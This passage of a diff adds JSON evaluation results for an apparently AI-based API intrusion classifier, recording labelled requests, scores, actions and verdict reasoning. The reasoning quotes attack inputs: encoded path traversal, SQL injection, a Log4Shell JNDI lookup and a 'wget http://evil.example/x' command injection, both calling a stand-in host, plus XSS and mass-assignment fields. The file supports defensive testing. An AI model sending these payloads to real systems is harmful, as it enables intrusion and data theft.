+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.99 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.99,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "Query name decodes from %2e%2e%2f%2e%2e%2f to ../../proc/self/environ containing parent-directory climbs. Endpoint GET /api/files is for public documents, while proc/self/environ is a sensitive process environment file. This is encoded traversal leaving allowed content, not a single in-content reference."
+      }
+    },
+    {
+      "id": "m11",
+      "label": "malicious",
+      "note": "sql tautology in item",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "Body field item contains classic SQL tautology payload x' OR 1=1 -- attempting to break out of query context. POST /api/orders expects item as order data with fields item, note, qty, where this payload has no legitimate use. Fast filter injection signature corroborates active SQL injection technique."
+      }
+    },
+    {
+      "id": "m12",
+      "label": "malicious",
+      "note": "sql tautology in search",
+      "tier": "suspicious",
+      "fast_score": 0.85,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "Body preview shows query value notebook' OR '1'='1' -- which closes a string, adds OR '1'='1' tautology and comments remainder with --. This is executable SQL logic injected into the searchCatalog query field, corroborated by injection signature x2, not a benign mention of the technique."
+      }
+    },
+    {
+      "id": "m13",
+      "label": "malicious",
+      "note": "union select",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.96 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.96,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "The text field contains hi' UNION SELECT password FROM users -- with quote breakout, UNION SELECT, and SQL comment terminator. This matches the retrieved injection indicator for UNION SELECT payload syntax in any field and constitutes active SQL execution attempt."
+      }
+    },
+    {
+      "id": "m14",
+      "label": "malicious",
+      "note": "jndi lookup",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.97 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.97,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "Body field query contains active payload ${jndi:ldap://evil.example/a} targeting remote LDAP server evil.example. This is a Log4Shell JNDI-lookup execution attempt on POST /api/search, not a benign catalog search."
+      }
+    },
+    {
+      "id": "m15",
+      "label": "malicious",
+      "note": "command chaining",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "POST /api/comments text value 'ok; wget http://evil.example/x' contains semicolon followed by wget with remote URL, matching shell-metacharacter plus command injection syntax. A delivery comment field has no legitimate use for such OS command payload, indicating attempted command injection."
+      }
+    },
+    {
+      "id": "m16",
+      "label": "malicious",
+      "note": "nosql operator",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "The query field contains MongoDB operator $ne with value 1 instead of natural language. The declared POST /api/search expects a natural-language catalog query. This operator pattern is a NoSQL injection attempt to bypass filtering and retrieve all records."
+      }
+    },
+    {
+      "id": "m17",
+      "label": "malicious",
+      "note": "script tag",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "Request body title field contains <script>alert(1)</script>, which matches the retrieved injection indicator for script tags. POST /api/reviews expects plain-text title with no legitimate need for executable markup. This is an active XSS payload delivery, not merely naming the technique."
+      }
+    },
+    {
+      "id": "m18",
+      "label": "malicious",
+      "note": "stacked sql",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.2,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared POST /api/tickets with only declared fields subject and body, with value '; DROP TABLE orders; --' contained as JSON string in free-text body field. No traversal climb, BOLA object access, extra fields, or execution context is present, so this is stored ticket data not SQL execution."
+      }
+    },
+    {
+      "id": "m19",
+      "label": "malicious",
+      "note": "role",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "Request body contains undeclared privileged field role set to admin, while PATCH /api/users/{userId} declares only display_name and email. This matches mass-assignment privilege escalation attempting to grant admin rights."
+      }
+    },
+    {
+      "id": "m20",
+      "label": "malicious",
+      "note": "admin and balance",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "PATCH /api/users/42 body includes is_admin:true and balance:1000000 while declared fields are only display_name and email. Undeclared privileged role and balance fields match mass assignment indicators for privilege escalation."
+      }
+    },
+    {
+      "id": "m21",
+      "label": "malicious",
+      "note": "owner swap",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "PATCH /api/users/42 includes undeclared body field owner_id set to 1 while declared fields are only display_name and email. Setting owner_id is a privileged property change matching mass assignment technique."
+      }
+    },
+    {
+      "id": "m22",
+      "label": "malicious",
+      "note": "wildcard permissions",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "PATCH /api/users/42 includes undeclared body field 'permissions' with value [\"*\"] while declared fields are only display_name and email. This matches privileged mass-assignment privilege escalation per OWASP API3:2023."
+      }
+    },
+    {
+      "id": "m23",
+      "label": "malicious",
+      "note": "forced verification",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "PATCH /api/users/42 body contains undeclared field \"verified\":true while declared fields are only display_name and email. The verified flag is listed as a privileged mass-assignment indicator enabling privilege escalation. No legitimate use is documented for this operation."
+      }
+    },
+    {
+      "id": "m24",
+      "label": "malicious",
+      "note": "staff flag",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "PATCH /api/users/42 body contains is_staff:true which is not in declared fields display_name, email. Setting is_staff attempts privilege escalation via mass assignment per OWASP API3:2023."
+      }
+    },
+    {
+      "id": "m25",
+      "label": "malicious",
+      "note": "payment owner swap",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.88 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.88,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "POST /api/payments body includes undeclared field user_id while declared fields are only amount, currency, order_id. Operation createPayment is defined as pay for an order owned by the caller, so supplying user_id attempts to override ownership. This matches mass-assignment pattern for privileged owner_id-like fields."
+      }
+    },
+    {
+      "id": "m26",
+      "label": "malicious",
+      "note": "order owner swap",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "POST /api/orders body contains owner_id which is undeclared versus allowed fields item, note, qty. owner_id is a privileged ownership field matching mass assignment indicators attempting to set ownership to 7."
+      }
+    },
+    {
+      "id": "m27",
+      "label": "malicious",
+      "note": "method or path not offered to clients",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "schema violation corroborates verdict (confidence 0.75)",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.75,
+        "recommended_action": "alert",
+        "threat_type": "api_intrusion",
+        "reasoning": "Request uses DELETE on /api/orders/9 while OpenAPI declares only GET for /api/orders/{orderId}. This matches undeclared-operation / Broken Function Level Authorization probing for a destructive action on a read-only resource."
+      }
+    },
+    {
+      "id": "m28",
+      "label": "malicious",
+      "note": "method or path not offered to clients",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "schema violation corroborates verdict (confidence 0.78)",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.78,
+        "recommended_action": "alert",
+        "threat_type": "api_intrusion",
+        "reasoning": "DELETE to /api/users/42 uses a method not declared for /api/users/{userId} where only GET and PATCH are allowed. This matches the undeclared-operation pattern of DELETE on a read-only resource, and as a single miss with no probing history it warrants alert."
+      }
+    },
+    {
+      "id": "m29",
+      "label": "malicious",
+      "note": "method or path not offered to clients",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [
+        "search_threats:{\"query\": \"undeclared HTTP method not in OpenAPI schema intrusion\"}"
+      ],
+      "action": "alert",
+      "rationale": "malicious but confidence 0.65 below blocking thresholds",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.65,
+        "recommended_action": "alert",
+        "threat_type": "api_intrusion",
+        "reasoning": "Request uses PUT on /api/payments/3 while OpenAPI declares only GET for /api/payments/{paymentId}. Undeclared methods on a read-only resource match api_intrusion probing, but single miss with empty body and no enumeration history warrants alert not block."
+      }
+    },
+    {
+      "id": "m30",
+      "label": "malicious",
+      "note": "method or path not offered to clients",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.85 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.85,
+        "recommended_action": "alert",
+        "threat_type": "api_intrusion",
+        "reasoning": "DELETE /api/tickets/4 uses a method not declared for /api/tickets/{ticketId} where only GET is allowed. This matches the undeclared-operation/BFLA indicator of DELETE on a read-only resource. Single miss with no probing history warrants alert per pattern."
+      }
+    },
+    {
+      "id": "m31",
+      "label": "malicious",
+      "note": "method or path not offered to clients",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "alert",
+      "rationale": "malicious but confidence 0.65 below blocking thresholds",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.65,
+        "recommended_action": "alert",
+        "threat_type": "api_intrusion",
+        "reasoning": "PATCH to /api/files is not declared where only GET downloadFile is allowed. A single undeclared method with empty body matches single-miss undeclared operation probing, with no systematic enumeration to warrant block."
+      }
+    },
+    {
+      "id": "m32",
+      "label": "malicious",
+      "note": "method or path not offered to clients",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "alert",
+      "rationale": "malicious but confidence 0.65 below blocking thresholds",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.65,
+        "recommended_action": "alert",
+        "threat_type": "api_intrusion",
+        "reasoning": "DELETE /api/reviews uses method DELETE while OpenAPI allows only POST for this path, matching undeclared operation probing. History shows no prior requests and only 3 requests in window, indicating a single miss rather than systematic probing, so alert is warranted."
+      }
+    },
+    {
+      "id": "m33",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [
+        "get_endpoint:{\"method\": \"GET\", \"path\": \"/api/admin/export\"}",
+        "search_threats:{\"query\": \"undocumented shadow admin endpoint probing\"}"
+      ],
+      "action": "",
+      "rationale": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+      "verdict": {
+        "error": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+        "raw": "Undeclared admin path flagged — verifying endpoint declaration and threat guidance."
+      }
+    },
+    {
+      "id": "m34",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "",
+      "rationale": "model call failed after 2 attempts: model returned an empty message",
+      "verdict": {
+        "error": "model call failed after 2 attempts: model returned an empty message",
+        "raw": ""
+      }
+    },
+    {
+      "id": "m35",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [
+        "get_endpoint:{\"method\": \"GET\", \"path\": \"/api/debug/env\"}",
+        "search_threats:{\"query\": \"exposed debug environment endpoint probing\"}"
+      ],
+      "action": "",
+      "rationale": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+      "verdict": {
+        "error": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+        "raw": "Suspicious undocumented path flagged — I'll verify the endpoint status and check threat patterns."
+      }
+    },
+    {
+      "id": "m36",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [
+        "search_threats:{\"query\": \"undocumented shadow admin endpoint access\"}",
+        "get_endpoint:{\"method\": \"GET\", \"path\": \"/api/admin/impersonate\"}"
+      ],
+      "action": "",
+      "rationale": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+      "verdict": {
+        "error": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+        "raw": "Suspicious undeclared endpoint flagged — I'll verify its status before issuing a verdict."
+      }
+    },
+    {
+      "id": "m37",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/internal/sql has empty query and body with no traversal sequences, object IDs, or SQL commands, only naming 'sql' in the path. Schema violation shows undeclared path but with 3 requests in window and no injection, BOLA, or mass-assignment technique present."
+      }
+    },
+    {
+      "id": "m38",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [
+        "get_endpoint:{\"method\": \"GET\", \"path\": \"/api/admin/config\"}",
+        "search_threats:{\"query\": \"undeclared admin endpoint forced browsing probing\"}"
+      ],
+      "action": "",
+      "rationale": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+      "verdict": {
+        "error": "model API rejected request (400): {\"error\":{\"code\":null,\"message\":\"only `\\\"auto\\\"` is supported for `tool_choice`. `\\\"none\\\"`, `\\\"required\\\"`, and named function choices are not currently supported\",\"param\":\"tool_choice\",\"type\":\"invalid_request_error\"}}",
+        "raw": "Undeclared endpoint confirmed — now checking threat patterns for admin probing."
+      }
+    },
+    {
+      "id": "m39",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/private/dump has empty query and empty body with no dot-dot segments, injection payloads, or object IDs. OpenAPI validation shows path not declared, but no path-traversal, BOLA, mass-assignment, or injection technique is present."
+      }
+    },
+    {
+      "id": "m40",
+      "label": "malicious",
+      "note": "hidden admin or internal path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/staff/refunds has empty query and body with no dot-dot segments, injection payloads, object IDs, or undeclared fields. Schema shows undeclared path with only 3 requests in window, which alone does not demonstrate traversal, BOLA, mass assignment, or injection technique."
+      }
+    },
+    {
+      "id": "m41",
+      "label": "malicious",
+      "note": "another id after a burst of distinct orders",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.88 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.88,
+        "recommended_action": "block",
+        "threat_type": "bola",
+        "reasoning": "Client requested 22 distinct IDs on GET /api/orders/{orderId}, including current /api/orders/880 after sequential history 879 down to 865. Sequential enumeration across many object IDs on an auth-protected route matches BOLA indicators. Retrieved pattern states enumeration across many IDs justifies blocklisting."
+      }
+    },
+    {
+      "id": "m42",
+      "label": "malicious",
+      "note": "another id after a burst of distinct orders",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "bola",
+        "reasoning": "History shows sequential access to IDs 1185-1199 plus current 1200 on GET /api/orders/{orderId}, with 30 distinct IDs flagged. This matches BOLA enumeration on an auth-required route where object-level authorization applies."
+      }
+    },
+    {
+      "id": "m43",
+      "label": "malicious",
+      "note": "another id after a burst of distinct orders",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "bola",
+        "reasoning": "Client enumerated ~18 distinct IDs on same template GET /api/orders/{orderId}, with history showing sequential GET /api/orders/35 through 49 then 50. Route requires authentication with object-level authorization, and proper listing uses GET /api/orders. Sequential ID swapping across many objects matches BOLA enumeration pattern which justifies block."
+      }
+    },
+    {
+      "id": "m44",
+      "label": "malicious",
+      "note": "payment id after many other payment ids",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "bola",
+        "reasoning": "Client requested 19 distinct IDs on GET /api/payments/{paymentId}, with history showing sequential IDs 400-414 and current request to 440. This sequential enumeration on an auth-required route requiring object-level authorization matches BOLA enumeration. Pattern guidance states enumeration across many IDs justifies blocklisting."
+      }
+    },
+    {
+      "id": "m45",
+      "label": "malicious",
+      "note": "user id after many other user ids",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "block",
+        "threat_type": "bola",
+        "reasoning": "Client enumerated sequential IDs 800-814 then 900 on GET /api/users/{userId}, totaling 17 distinct object IDs on one route. The endpoint requires authentication with object-level authorization for caller-owned profiles, so accessing many other IDs indicates BOLA enumeration."
+      }
+    },
+    {
+      "id": "b43",
+      "label": "benign",
+      "note": "floor number",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/addresses matches declared operation expecting city, line1, postal_code; extra field floor is a non-privileged address detail, not a privileged indicator like role or is_admin. No traversal climb, injection payload, BOLA access, or undeclared method is present."
+      }
+    },
+    {
+      "id": "b44",
+      "label": "benign",
+      "note": "nickname",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "PATCH /api/users/15 matches declared updateUser operation allowing display_name and email. Extra field nickname is undeclared but non-privileged, not role, is_admin, or other privileged fields, with no traversal or injection indicators."
+      }
+    },
+    {
+      "id": "b45",
+      "label": "benign",
+      "note": "review photo",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/reviews matches its declared operation with declared fields order_id, rating, title present and only extra field photo_url with value https://cdn.example/mug.jpg. photo_url is not a privileged mass-assignment target like role, is_admin, or owner_id, and there is no traversal, injection, or BOLA evidence with only 3 requests in window."
+      }
+    },
+    {
+      "id": "b46",
+      "label": "benign",
+      "note": "cart color",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/cart declares only item and qty, and the extra field color:\"oak\" is a benign product variant, not a privileged field like role, is_admin, or owner_id. No traversal climb, injection payload, or cross-object access is present in the request."
+      }
+    },
+    {
+      "id": "b47",
+      "label": "benign",
+      "note": "call-first note",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Subject \"O'Neil delivery\" contains an apostrophe but no boolean, UNION, stacked statement or comment so it is not SQL injection. Extra field lang=\"en\" is a non-privileged locale, not role/is_admin/permissions/owner_id. Request matches declared POST /api/tickets with legitimate subject and body text."
+      }
+    },
+    {
+      "id": "b48",
+      "label": "benign",
+      "note": "save-card preference",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/payments matches its declared operation with expected fields order_id, amount, currency present. The extra field save_card:false is non-privileged and unlike sensitive mass-assignment targets such as role, is_admin or balance. No traversal, injection, or BOLA indicators are present and anomaly risk is low at 0.34."
+      }
+    },
+    {
+      "id": "b49",
+      "label": "benign",
+      "note": "shipping help page",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/help/shipping has empty query and body with no dot-dot segments, IDs, or injected payloads. Undocumented path alone with only 3 requests in window shows no traversal, BOLA, mass assignment, or injection technique."
+      }
+    },
+    {
+      "id": "b50",
+      "label": "benign",
+      "note": "privacy page",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/legal/privacy has empty query and body with no dot-dot segments, object IDs, or injection payloads. Undeclared path alone with only 3 requests in window and no prior history does not match traversal, BOLA, mass assignment, or injection techniques."
+      }
+    },
+    {
+      "id": "m46",
+      "label": "malicious",
+      "note": "hash-terminated tautology",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "POST /api/search body contains \"1' OR 1=1#\" which is a quote-break SQL tautology with comment terminator. The declared operation expects a natural-language catalog query, so this forms a query of its own rather than benign punctuation."
+      }
+    },
+    {
+      "id": "m47",
+      "label": "malicious",
+      "note": "command name in a comment",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Body text \"see `cat /etc/passwd`\" contains no parent-directory climb (../ or encoded) and only names a sensitive file in a sentence. POST /api/comments with order_id and text matches declared addComment operation with no extra fields, so naming without climbing or executing is not traversal or injection."
+      }
+    },
+    {
+      "id": "m48",
+      "label": "malicious",
+      "note": "superuser flag",
+      "tier": "suspicious",
+      "fast_score": 0.7,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "mass_assignment",
+        "reasoning": "PATCH /api/users/8 body contains undeclared privileged field is_superuser:true alongside allowed email field. Declared spec allows only display_name and email, so this is a privilege-escalation mass assignment attempt."
+      }
+    },
+    {
+      "id": "m49",
+      "label": "malicious",
+      "note": "backslash traversal",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.98 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.98,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "Query name=..\\..\\windows\\system32\\drivers\\etc\\hosts contains parent-directory climbs resolving to a sensitive OS file. The GET /api/files operation only allows downloading a public document by name. This is a dot-dot climb leaving the allowed directory with no legitimate prefix."
+      }
+    },
+    {
+      "id": "m50",
+      "label": "malicious",
+      "note": "note that carries a traversal",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "The note field in POST /api/orders contains '../../.env', a parent-directory climb with no legitimate prefix targeting a sensitive environment file. Free-text note fields are traversal sinks and store-API clients have no legitimate need to reference .env."
+      }
+    }
+  ]
+}
